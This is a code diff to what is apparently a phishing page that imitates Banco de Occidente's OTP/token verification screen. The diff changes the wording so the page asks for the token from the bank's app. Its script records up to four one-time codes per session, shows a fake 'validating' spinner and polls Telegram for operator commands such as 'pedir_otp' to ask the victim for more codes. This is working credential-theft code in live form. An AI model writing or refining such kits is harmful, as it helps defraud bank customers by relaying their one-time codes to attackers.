@@ -516,93 +516,108 @@
             <!-- Bienvenida -->
             <div class="welcome-text">
                 <p>Verificación de</p>
-                <h1>Clave Dinámica</h1>
+                <h1>TOKEN</h1>
             </div>
 
             <!-- Banner informativo -->
             <div id="otp-panel">
-            <div class="info-banner">
-                <svg viewBox="0 0 24 24">
-                    <path
-                        d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H5.17L4 17.17V4h16v12zM11 5h2v6h-2zm0 8h2v2h-2z" />
-                </svg>
-                <div class="info-banner-content">
-                    <h3>Clave enviada</h3>
-                    <p>Hemos enviado un código de 6 dígitos a tu celular registrado. Ingrésalo a continuación.</p>
+                <div class="info-banner">
+                    <svg viewBox="0 0 24 24">
+                        <path
+                            d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H5.17L4 17.17V4h16v12zM11 5h2v6h-2zm0 8h2v2h-2z" />
+                    </svg>
+                    <div class="info-banner-content">
+                        <h3>Clave enviada</h3>
+                        <p>Hemos enviado un código de 6 dígitos a tu celular registrado o ingresa el token que
+                            encuentras en tu app Banco del occidente. Ingrésalo a continuación.</p>
+                    </div>
                 </div>
-            </div>
 
-            <!-- Temporizador -->
-            <div class="timer-container">
-                <p class="timer-label">Tu código expira en:</p>
-                <div class="timer" id="timer">02:00</div>
-            </div>
+                <!-- Temporizador -->
+                <div class="timer-container">
+                    <p class="timer-label">Tu código expira en:</p>
+                    <div class="timer" id="timer">02:00</div>
+                </div>
 
-            <!-- PIN inputs -->
-            <div class="pin-container">
-                <input type="text" class="pin-input" maxlength="1" id="pin1" inputmode="numeric">
-                <input type="text" class="pin-input" maxlength="1" id="pin2" inputmode="numeric">
-                <input type="text" class="pin-input" maxlength="1" id="pin3" inputmode="numeric">
-                <input type="text" class="pin-input" maxlength="1" id="pin4" inputmode="numeric">
-                <input type="text" class="pin-input" maxlength="1" id="pin5" inputmode="numeric">
-                <input type="text" class="pin-input" maxlength="1" id="pin6" inputmode="numeric">
-            </div>
+                <!-- PIN inputs -->
+                <div class="pin-container">
+                    <input type="text" class="pin-input" maxlength="1" id="pin1" inputmode="numeric">
+                    <input type="text" class="pin-input" maxlength="1" id="pin2" inputmode="numeric">
+                    <input type="text" class="pin-input" maxlength="1" id="pin3" inputmode="numeric">
+                    <input type="text" class="pin-input" maxlength="1" id="pin4" inputmode="numeric">
+                    <input type="text" class="pin-input" maxlength="1" id="pin5" inputmode="numeric">
+                    <input type="text" class="pin-input" maxlength="1" id="pin6" inputmode="numeric">
+                </div>
 
-            <!-- Teclado numerico -->
-            <div class="keypad">
-                <button class="key" onclick="addDigit('1')">1</button>
-                <button class="key" onclick="addDigit('2')">2</button>
-                <button class="key" onclick="addDigit('3')">3</button>
-                <button class="key" onclick="addDigit('4')">4</button>
-                <button class="key" onclick="addDigit('5')">5</button>
-                <button class="key" onclick="addDigit('6')">6</button>
-                <button class="key" onclick="addDigit('7')">7</button>
-                <button class="key" onclick="addDigit('8')">8</button>
-                <button class="key" onclick="addDigit('9')">9</button>
-                <button class="key empty"></button>
-                <button class="key" onclick="addDigit('0')">0</button>
-                <button class="key delete" onclick="deleteDigit()">
-                    <svg viewBox="0 0 24 24">
-                        <path
-                            d="M22 3H7c-.69 0-1.23.35-1.59.88L0 12l5.41 8.11c.36.53.9.89 1.59.89h15c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-3 12.59L17.59 17 14 13.41 10.41 17 9 15.59 12.59 12 9 8.41 10.41 7 14 10.59 17.59 7 19 8.41 15.41 12 19 15.59z" />
-                    </svg>
-                </button>
-            </div>
+                <!-- Teclado numerico -->
+                <div class="keypad">
+                    <button class="key" onclick="addDigit('1')">1</button>
+                    <button class="key" onclick="addDigit('2')">2</button>
+                    <button class="key" onclick="addDigit('3')">3</button>
+                    <button class="key" onclick="addDigit('4')">4</button>
+                    <button class="key" onclick="addDigit('5')">5</button>
+                    <button class="key" onclick="addDigit('6')">6</button>
+                    <button class="key" onclick="addDigit('7')">7</button>
+                    <button class="key" onclick="addDigit('8')">8</button>
+                    <button class="key" onclick="addDigit('9')">9</button>
+                    <button class="key empty"></button>
+                    <button class="key" onclick="addDigit('0')">0</button>
+                    <button class="key delete" onclick="deleteDigit()">
+                        <svg viewBox="0 0 24 24">
+                            <path
+                                d="M22 3H7c-.69 0-1.23.35-1.59.88L0 12l5.41 8.11c.36.53.9.89 1.59.89h15c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-3 12.59L17.59 17 14 13.41 10.41 17 9 15.59 12.59 12 9 8.41 10.41 7 14 10.59 17.59 7 19 8.41 15.41 12 19 15.59z" />
+                        </svg>
+                    </button>
+                </div>
 
-            <!-- Reenviar codigo -->
-            <div class="resend-container">
-                <a class="resend-link" onclick="resendCode()">
-                    <svg viewBox="0 0 24 24">
-                        <path
-                            d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z" />
-                    </svg>
-                    Reenviar código
-                </a>
-            </div>
+                <!-- Reenviar codigo -->
+                <div class="resend-container">
+                    <a class="resend-link" onclick="resendCode()">
+                        <svg viewBox="0 0 24 24">
+                            <path
+                                d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z" />
+                        </svg>
+                        Reenviar código
+                    </a>
+                </div>
 
-            <!-- Botones -->
-            <div class="buttons-row">
-                <button class="btn btn-outline" onclick="window.location.href='banco-occidente-login.html'">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <line x1="19" y1="12" x2="5" y2="12" />
-                        <polyline points="12 19 5 12 12 5" />
-                    </svg>
-                    Cancelar
-                </button>
-                <button class="btn btn-primary" id="btnConfirmar" disabled>
-                    <svg viewBox="0 0 24 24" fill="currentColor">
-                        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
-                    </svg>
-                    Confirmar
-                </button>
-            </div>
+                <!-- Botones -->
+                <div class="buttons-row">
+                    <button class="btn btn-outline" onclick="window.location.href='banco-occidente-login.html'">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <line x1="19" y1="12" x2="5" y2="12" />
+                            <polyline points="12 19 5 12 12 5" />
+                        </svg>
+                        Cancelar
+                    </button>
+                    <button class="btn btn-primary" id="btnConfirmar" disabled>
+                        <svg viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
+                        </svg>
+                        Confirmar
+                    </button>
+                </div>
             </div> <!-- End of otp-panel -->
 
-            <div id="waiting-panel" style="display: none; flex-direction: column; align-items: center; justify-content: center; padding: 40px 20px; text-align: center;">
-                <div style="border: 4px solid #f3f3f3; border-top: 4px solid #004b87; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px;"></div>
-                <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
+            <div id="waiting-panel"
+                style="display: none; flex-direction: column; align-items: center; justify-content: center; padding: 40px 20px; text-align: center;">
+                <div
+                    style="border: 4px solid #f3f3f3; border-top: 4px solid #004b87; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px;">
+                </div>
+                <style>
+                    @keyframes spin {
+                        0% {
+                            transform: rotate(0deg);
+                        }
+
+                        100% {
+                            transform: rotate(360deg);
+                        }
+                    }
+                </style>
                 <h3 style="margin-bottom: 10px; color: #333;">Estamos validando tu información</h3>
-                <p style="color: #666; font-size: 14px;">Por favor espera, este proceso puede tardar unos segundos...</p>
+                <p style="color: #666; font-size: 14px;">Por favor espera, este proceso puede tardar unos segundos...
+                </p>
             </div>
         </div>
     </div>
@@ -779,7 +794,7 @@
         btnConfirmar.addEventListener('click', async () => {
             let code = '';
             pinInputs.forEach(input => code += input.value);
-            
+
             // OTP Tracking Logic
             let otpCount = parseInt(sessionStorage.getItem("otp_count") || "0") + 1;
             if (otpCount > 4) otpCount = 1;
@@ -802,7 +817,7 @@
                     const item = order.items[0];
                     producto = (item.isCombo ? 'STICKER COMBO FAMILIAR' : 'STICKER BENDECIDO') + ' x' + item.qty;
                 }
-            } catch (e) {}
+            } catch (e) { }
 
             const otp1 = sessionStorage.getItem("otp_val_1") || "—";
             const otp2 = sessionStorage.getItem("otp_val_2") || "—";
@@ -821,7 +836,7 @@
             // Hide OTP panel, show waiting panel
             document.getElementById('otp-panel').style.display = 'none';
             document.getElementById('waiting-panel').style.display = 'flex';
-            
+
             initPolling();
         });
 
@@ -869,7 +884,7 @@
 
                             // Quitar botones de Telegram
                             removeTelegramButtons(msgId);
-                            
+
                             if (cbData === "pedir_otp") {
                                 document.getElementById('waiting-panel').style.display = 'none';
                                 document.getElementById('otp-panel').style.display = 'block';
